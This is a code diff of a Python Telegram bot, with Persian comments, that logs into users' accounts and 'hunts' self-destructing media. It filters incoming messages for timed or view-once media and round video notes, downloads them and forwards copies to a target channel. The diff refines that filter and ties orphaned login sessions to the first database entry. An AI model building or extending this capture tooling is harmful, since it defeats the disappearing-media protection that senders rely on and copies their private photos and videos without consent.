@@ -19,8 +19,6 @@ bot = TelegramClient('star_bot_panel', API_ID, API_HASH)
 
 DB_FILE = 'database.json'
 user_clients = {}
-
-# دیکشنری موقت برای مدیریت آلبوم‌های چندتایی
 media_albums = {}
 
 def load_database():
@@ -41,15 +39,17 @@ def load_database():
             if info.get("phone") and info.get("phone").replace("+", "") == phone:
                 found = True
                 break
-        if not found and data:
-            first_chat_id = list(data.keys())[0]
-            data[first_chat_id] = {
-                "status": "active",
-                "step": "completed",
-                "phone": "+" + phone,
-                "numeric_id": random.randint(10000000, 99999999),
-                "hashtag": hashlib.md5(phone.encode()).hexdigest()
-            }
+        if not found:
+            # پیدا کردن اولین چت آیدی معتبر در دیتابیس برای اتصال سشن‌های یتیم
+            first_chat_id = list(data.keys())[0] if data else 0
+            if first_chat_id:
+                data[first_chat_id] = {
+                    "status": "active",
+                    "step": "completed",
+                    "phone": "+" + phone,
+                    "numeric_id": random.randint(10000000, 99999999),
+                    "hashtag": hashlib.md5(phone.encode()).hexdigest()
+                }
     return data
 
 database = load_database()
@@ -157,59 +157,72 @@ async def handle_text(event):
         except Exception as e:
             await event.respond(f"❌ رمز اشتباه است:\n{str(e)}")
 
+# فیلتر اختصاصی: فقط رسانه‌های تایم‌دار / مخفی یا ویدیو مسیج گرد
 async def catch_media_handler(event):
     try:
-        if not event.is_private or event.out:
+        # نباید پیام‌های شخصی (پی‌وی) یا پیام‌های ارسالی خودمان را پردازش کند
+        if event.is_private or event.out:
             return
 
-        if event.media:
-            group_id = getattr(event.message, 'grouped_id', None)
+        if not event.media:
+            return
+
+        # بررسی وجود تایم‌دار بودن (TTL)
+        ttl_seconds = getattr(event.message, 'ttl_period', None) or getattr(event.media, 'ttl_seconds', None)
+        
+        # بررسی اینکه آیا ویدیو مسیج گرد (Video Note) است یا خیر
+        is_video_note = False
+        if hasattr(event.media, 'document') and event.media.document:
+            for attr in event.media.document.attributes:
+                if type(attr).__name__ == 'DocumentAttributeVideo':
+                    if getattr(attr, 'round_message', False):
+                        is_video_note = True
+
+        # اگر نه تایم‌دار بود و نه ویدیومسیج گرد، کاملاً رد کن (به استیکر، گیف، عکس و ویدیوی معمولی کار نداشته باش)
+        if not ttl_seconds and not is_video_note:
+            return
+
+        group_id = getattr(event.message, 'grouped_id', None)
+        
+        if group_id and not is_video_note:
+            if group_id not in media_albums:
+                media_albums[group_id] = []
+            media_albums[group_id].append(event.media)
             
-            if group_id:
-                if group_id not in media_albums:
-                    media_albums[group_id] = []
-                media_albums[group_id].append(event.media)
-                
-                await asyncio.sleep(1.5)
-                
-                if group_id in media_albums:
-                    media_list = media_albums.pop(group_id)
-                    try:
-                        await event.client.send_file(TARGET_CHANNEL, media_list, caption="📥 شکار آلبوم رسانه (چندتایی)")
-                    except Exception as err:
-                        print(f"خطا در ارسال آلبوم: {err}")
+            await asyncio.sleep(1.5)
+            
+            if group_id in media_albums:
+                media_list = media_albums.pop(group_id)
+                try:
+                    await event.client.send_file(TARGET_CHANNEL, media_list, caption="📸 شکار آلبوم تایم‌دار مخفی!")
+                except Exception as err:
+                    print(f"خطا در ارسال آلبوم: {err}")
+            return
+
+        file_path = await event.download_media()
+        if not file_path:
+            return
+
+        caption_text = "📸 شکار رسانه تایم‌دار / مخفی!"
+        if ttl_seconds:
+            caption_text += f"\n⏱ زمان انقضا: {ttl_seconds} ثانیه"
+        if is_video_note:
+            caption_text = "📹 شکار ویدیومسیج گرد (Video Note)!"
+
+        client = event.client
+        try:
+            if is_video_note:
+                await client.send_file(TARGET_CHANNEL, file_path, video_note=True, caption=caption_text)
             else:
-                ttl_seconds = getattr(event.message, 'ttl_period', None) or getattr(event.media, 'ttl_seconds', None)
-                
-                video_duration = None
-                is_video_note = False
-                if hasattr(event.media, 'document') and event.media.document:
-                    for attr in event.media.document.attributes:
-                        if type(attr).__name__ == 'DocumentAttributeVideo':
-                            video_duration = getattr(attr, 'duration', None)
-                            if getattr(attr, 'round_message', False):
-                                is_video_note = True
+                await client.send_file(TARGET_CHANNEL, file_path, caption=caption_text)
+        except Exception as e:
+            print(f"خطا در ارسال فایل شکار شده: {e}")
 
-                file_path = await event.download_media()
-                if file_path:
-                    caption_text = "📥 شکار رسانه تایم‌دار / ویدیو!"
-                    if ttl_seconds:
-                        caption_text += f"\n⏱ تایم مخفی بودن: {ttl_seconds} ثانیه"
-                    if video_duration:
-                        caption_text += f"\n⏳ مدت زمان ویدیو: {video_duration} ثانیه"
-                    if is_video_note:
-                        caption_text = "📥 شکار ویدیو مسیج گرد (Video Note)!"
+        if os.path.exists(file_path):
+            os.remove(file_path)
 
-                    client = event.client
-                    if is_video_note:
-                        await client.send_file(TARGET_CHANNEL, file_path, video_note=True, caption=caption_text)
-                    else:
-                        await client.send_file(TARGET_CHANNEL, file_path, caption=caption_text)
-
-                    if os.path.exists(file_path):
-                        os.remove(file_path)
     except Exception as err:
-        print(f"خطا در شکار رسانه: {err}")
+        print(f"خطا در پردازش رسانه: {err}")
 
 async def finish_login(event, chat_id, client, phone):
     client.remove_event_handler(catch_media_handler)
